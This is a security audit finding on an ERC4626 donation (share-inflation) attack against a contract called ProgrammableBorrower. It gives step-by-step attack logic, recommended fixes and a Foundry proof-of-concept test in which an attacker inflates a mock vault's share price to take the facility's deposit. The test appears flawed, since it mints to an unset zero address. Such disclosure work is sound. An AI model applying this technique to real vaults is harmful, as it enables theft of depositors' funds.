### Title
ERC4626 donation attack can steal programmable-borrower principal - ([File: `contracts/strategies/idle/ProgrammableBorrower.sol`](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` deposits pooled assets into a configurable ERC4626 vault but accepts the returned share amount without enforcing a minimum or comparing it with an independent expected value. [1](#0-0)  An unprivileged vault user who seeds the vault before the credit facility deposits can inflate the exchange rate and make the facility receive zero shares while the vault retains its assets.

### Finding Description

The factory supports a programmable-borrower deployment backed by a supplied ERC4626 vault. [2](#0-1)  `ProgrammableBorrower.initialize` approves that vault for unlimited underlying spending. [3](#0-2) 

At epoch start, `IdleCDOEpochVariant.startEpoch` transfers surplus pool assets to the programmable borrower. [4](#0-3)  `onStartEpoch` then snapshots pre-deposit assets and deposits the full cash balance into the vault. [5](#0-4) 

The vulnerable sequence is:

1. The configured ERC4626 vault is empty or has been seeded by the attacker with one share.
2. The attacker donates underlying directly to the vault, making `totalAssets >> totalSupply`.
3. `vault.deposit(assets, ProgrammableBorrower)` rounds down and returns zero shares.
4. `_depositToVault` ignores the zero `shares` result and emits success. [1](#0-0) 
5. `_currentVaultAssets` reports zero because it multiplies the facility's zero share balance by `convertToAssets`. [6](#0-5) 
6. The attacker redeems their one share and receives the donation plus the facility's deposit.

This is analogous to unsafe external-entity resolution: the facility delegates custody and valuation to an external ERC4626 entity without validating that the external position it receives actually represents the assets transferred.

### Impact Explanation

The attacker can steal the full amount deposited into the vulnerable ERC4626 vault, subject to funding a sufficiently large donation.

For a vault using the common formula:

```solidity
shares = assets * totalSupply / totalAssets;
```

with attacker state `totalSupply == 1` and donated `totalAssets >= assets + 1`, the facility's deposit mints zero shares. The attacker then redeems the only share for approximately `assets + donation`.

The credit vault's normal skim guard does not prevent this because the donation is sent to the external ERC4626 vault, not directly to `IdleCDOEpochVariant`. [7](#0-6)  On stop, the programmable borrower cannot recall the lost principal, and `IdleCDOEpochVariant` treats the failed transfer as borrower default. [8](#0-7) 

### Likelihood Explanation

Exploitation requires the configured ERC4626 vault to be susceptible to share inflation and to have negligible outstanding supply before the facility establishes its position. Ordinary unprivileged vault users can normally make the required deposit and direct-asset donation.

The attack does not require control of the owner, manager, borrower, queue, or Keyring roles. It only requires the facility to deposit into a vault whose exchange rate the attacker has already manipulated.

### Recommendation

In `ProgrammableBorrower._depositToVault`, validate the received share amount before accepting the deposit:

- call `previewDeposit(_assetAmount)` and require `shares >= minShares`, or
- snapshot `convertToAssets(vault.balanceOf(address(this)))` before and after the deposit and require the position increase to be within an accepted slippage bound;
- revert on `shares == 0` for nonzero deposits;
- preferably require deployments to use ERC4626 vaults with virtual shares or another inflation-resistant implementation.

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Asset is ERC20 {
    constructor() ERC20("Asset", "AST") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// ERC4626-like vault without inflation protection.
contract InflatableVault is ERC20 {
    IERC20 public immutable assetToken;

    constructor(IERC20 asset_) ERC20("Vault Share", "vAST") {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 assetsBefore = totalAssets();
        uint256 supply = totalSupply();

        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;

        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract ProgrammableBorrowerInflationTest is Test {
    Asset internal token;
    InflatableVault internal externalVault;

    address internal attacker = makeAddr("attacker");
    address internal programmableBorrower;

    function testExternalVaultInflationStealsFacilityDeposit() public {
        token = new Asset();
        externalVault = new InflatableVault(IERC20(address(token)));

        uint256 facilityDeposit = 1_000_000e18;
        uint256 attackerDonation = 10_000_000e18;

        token.mint(attacker, attackerDonation + 1);
        token.mint(programmableBorrower, facilityDeposit);

        // Attacker seeds an otherwise-empty vault with one wei/share.
        vm.startPrank(attacker);
        token.approve(address(externalVault), 1);
        externalVault.deposit(1, attacker);

        // Attacker inflates the share price through a direct donation.
        token.transfer(address(externalVault), attackerDonation);
        vm.stopPrank();

        // Equivalent to ProgrammableBorrower._depositToVault:
        // the returned share amount is accepted without validation.
        vm.prank(programmableBorrower);
        token.approve(address(externalVault), facilityDeposit);

        vm.prank(programmableBorrower);
        uint256 shares = externalVault.deposit(
            facilityDeposit,
            programmableBorrower
        );

        assertEq(shares, 0);
        assertEq(externalVault.balanceOf(programmableBorrower), 0);
        assertEq(
            externalVault.convertToAssets(
                externalVault.balanceOf(programmableBorrower)
            ),
            0
        );

        uint256 attackerBefore = token.balanceOf(attacker);
        vm.prank(attacker);
        externalVault.redeem(1, attacker, attacker);

        assertGt(token.balanceOf(attacker) - attackerBefore, facilityDeposit);
    }
}
